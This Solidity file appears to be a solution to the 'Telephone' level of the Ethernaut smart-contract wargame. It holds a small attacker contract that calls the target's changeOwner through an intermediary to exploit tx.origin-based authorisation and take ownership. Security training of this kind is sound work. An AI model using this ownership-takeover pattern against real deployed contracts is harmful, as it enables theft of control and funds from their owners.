// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 04: Telephone
// https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768

contract Telephone_Hack {
    address telephoneInstance;

    constructor(address _telephoneInstance) {
        telephoneInstance = _telephoneInstance;
    }

    function changeOwner() public {
        ITelephone c = ITelephone(telephoneInstance);
        c.changeOwner(msg.sender);
    }
}

interface ITelephone {
    function changeOwner(address) external;
}